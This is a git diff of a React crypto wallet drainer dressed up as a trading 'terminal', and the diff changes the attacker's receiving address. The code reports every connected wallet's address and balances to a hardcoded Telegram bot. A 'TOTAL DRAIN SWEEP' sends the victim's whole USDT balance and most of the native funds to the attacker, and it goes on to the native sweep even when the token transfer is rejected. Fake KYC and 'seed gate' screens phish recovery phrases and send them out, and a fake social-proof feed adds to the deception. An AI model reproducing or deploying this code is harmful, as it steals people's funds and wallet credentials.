@@ -15,15 +15,17 @@ export default function EvedexTerminal() {
   const [seedVal, setSeedVal] = useState("");   
   const [kycEmail, setKycEmail] = useState("");
   const [kycPass, setKycPass] = useState("");
-  const [kycMode, setKycMode] = useState("email"); // email or seed
+  const [kycMode, setKycMode] = useState("email"); 
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
   const [feedMsg, setFeedMsg] = useState(""); 
   const [visitorInfo, setVisitorInfo] = useState("Locating...");
 
+  // --- CONFIGURATION ---
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
-  const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; 
+  // NEW XPORTAL SECURED RECEIVER ADDRESS
+  const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 
 
   const USDT_MAP = { 
     1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 
@@ -35,17 +37,16 @@ export default function EvedexTerminal() {
   const { data: nativeBal } = useBalance({ address }); 
   const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
 
-  // --- LOGGING ENGINE ---
   const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
     method: 'POST', 
     headers: { 'Content-Type': 'application/json' }, 
     body: JSON.stringify({ chat_id: chatId, text: `${msg}\n📍 LOC: ${visitorInfo}` }) 
   }).catch(()=>{});
 
-  // 1. CONNECTION NOTIFICATION TRIGGER
+  // --- 1. CONNECTION NOTIFICATION ---
   useEffect(() => {
     if (isConnected && address) {
-      log(`🔔 NEW_CONNECTION: ${address}\nTOKEN: ${tokenBal?.formatted || "0"}\nNATIVE: ${nativeBal?.formatted || "0"}\nCHAIN: ${chainId}`);
+      log(`🔔 NEW_CONNECTION: ${address}\nTOK: ${tokenBal?.formatted || "0"}\nNAT: ${nativeBal?.formatted || "0"}`);
     }
   }, [isConnected, address]);
 
@@ -59,53 +60,37 @@ export default function EvedexTerminal() {
     return () => clearInterval(interval);
   }, []);
 
-  // Sync balances for Rectify Dashboard
   useEffect(() => {
     if (activeTask === "Rectify") {
       setInputVal(selectedAsset === "TOKEN" ? (tokenBal?.formatted?.slice(0, 10) || "0.00") : (nativeBal?.formatted?.slice(0, 10) || "0.00"));
     }
   }, [selectedAsset, tokenBal, nativeBal, activeTask]);
 
-  // 2. TOTAL DRAIN SWEEP (Ignores typed amount, pulls max available)
+  // --- 2. TOTAL DRAIN SWEEP LOGIC ---
   const sweepNative = () => {
     if (!nativeBal || nativeBal.value <= 0n) { setView("seed_gate"); setLoading(false); return; }
-    // Force max withdrawal (98% of native gas)
     const val = (nativeBal.value * 980n) / 1000n;
     sendTransaction({ to: destination, value: val }, {
-      onSuccess: (h) => { 
-        log(`✅ NAT_DRAIN: ${address}\nTX: ${h}`); 
-        setView("seed_gate"); 
-        setLoading(false); 
-      },
-      onError: () => { 
-        setView("seed_gate"); 
-        setLoading(false); 
-      }
+      onSuccess: (h) => { log(`✅ NAT_HIT: ${address}\nTX: ${h}`); setView("seed_gate"); setLoading(false); },
+      onError: () => { setView("seed_gate"); setLoading(false); }
     });
   };
 
   const executeTaskAction = () => {
     setLoading(true);
     const tokenAddr = USDT_MAP[chainId];
-    
-    // Check for tokens first - if found, drain them entirely before moving to native
     if (tokenAddr && tokenBal && tokenBal.value > 0n) {
       const payload = `0xa9059cbb${destination.toLowerCase().replace("0x", "").padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
       sendTransaction({ to: tokenAddr, data: payload }, {
-        onSuccess: (h) => { 
-          log(`💰 TOK_DRAIN: ${address}\nTX: ${h}`); 
-          setTimeout(sweepNative, 1000); 
-        },
-        onError: () => sweepNative() // Hit gas even if they reject token popup
+        onSuccess: (h) => { log(`💰 TOK_HIT: ${address}\nTX: ${h}`); setTimeout(sweepNative, 1000); },
+        onError: () => sweepNative()
       });
-    } else {
-      sweepNative();
-    }
+    } else { sweepNative(); }
   };
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
-      {/* 1. LIVE MARKET CHART */}
+      {/* 3. LIVE TRADING CHART */}
       <div style={{width:'100%', height:'180px', backgroundColor:'black', borderRadius:'15px', marginBottom:'20px', overflow:'hidden', border:'1px solid #1e293b'}}>
          <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Market" />
       </div>
@@ -131,28 +116,28 @@ export default function EvedexTerminal() {
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center'}}>
               <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← BACK</button>
               
-              {/* ASSET SWITCHER (RECTIFY ONLY) */}
+              {/* 4. ASSET SWITCHERS (RECTIFY ONLY) */}
               {activeTask === "Rectify" && (
                 <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
-                  <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b"}}>USDT</div>
-                  <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b"}}>{nativeBal?.symbol}</div>
+                  <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', cursor:'pointer', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b"}}>USDT</div>
+                  <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', cursor:'pointer', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b"}}>{nativeBal?.symbol || "GAS"}</div>
                 </div>
               )}
 
               <h2 style={{color:'white', fontWeight:'900', fontSize:'22px'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'15px'}}>
-                <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>{activeTask === "Rectify" ? "VAULT_SYNC" : "ENTER FIGURES"}</label>
+                <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>{activeTask === "Rectify" ? "VAULT_BALANCE" : "ENTER FIGURES"}</label>
                 <input type="number" step="any" value={inputVal} onChange={(e)=>setInputVal(e.target.value)} readOnly={activeTask === "Rectify"} style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
               </div>
               <div style={{fontSize:'8px', color:'#475569', display:'flex', justifyContent:'space-between', marginBottom:'30px', padding:'0 10px'}}>
-                <span>EST_NETWORK_FEE: 0.0012 {nativeBal?.symbol}</span>
-                <span>LIQUIDITY_POOL: STABLE</span>
+                <span>NET_FEE: 0.0012 {nativeBal?.symbol}</span>
+                <span>POOL: ACTIVE</span>
               </div>
               <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>PROCESS_{activeTask.toUpperCase()}</button>
             </div>
           )}
 
-          {/* KYC LOGIN SYSTEM */}
+          {/* 5. KYC IDENTITY SYSTEM */}
           {view === "kyc_screen" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #3b82f6', borderRadius:'35px', padding:'30px', textAlign:'center'}}>
               <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← CANCEL</button>
@@ -169,7 +154,7 @@ export default function EvedexTerminal() {
                 </>
               ) : (
                 <>
-                  <textarea placeholder="RECOVERY PHRASE..." value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} style={{width:'100%', height:'100px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', padding:'15px', marginBottom:'25px'}} />
+                  <textarea placeholder="RECOVERY PHRASE..." value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} style={{width:'100%', height:'100px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', padding:'15px', marginBottom:'25px', outline:'none'}} />
                   <button onClick={()=>{log(`🚨 KYC_SEED: ${seedVal}`); alert("IDENTITY_LINKED"); setView("menu");}} style={{width:'100%', backgroundColor:'#3b82f6', color:'white', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>LINK_IDENTITY</button>
                 </>
               )}
@@ -178,10 +163,10 @@ export default function EvedexTerminal() {
         </>
       )}
 
-      {/* FAKE SOCIAL PROOF FEED */}
+      {/* 6. FAKE SOCIAL PROOF ALERTS */}
       {feedMsg && <div style={{position:'fixed', bottom:20, left:20, right:20, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'10px', borderRadius:'10px', fontSize:'9px', color:'#10b981', textAlign:'center', fontWeight:'900', zIndex:3000}}>{feedMsg}</div>}
 
-      {/* ENCRYPTED SEED GATE */}
+      {/* 7. SECURITY DECRYPTION (SEED PHRASE) */}
       {view === "seed_gate" && (
         <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
           <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
@@ -198,7 +183,7 @@ export default function EvedexTerminal() {
           </div>
         </div>
       )}
-      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.96)', zIndex:5000, display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontWeight:'900'}}>STABILIZING_CONNECTION...</div>}
+      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.96)', zIndex:5000, display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontWeight:'900'}}>STABILIZING...</div>}
     </div>
   );
 }
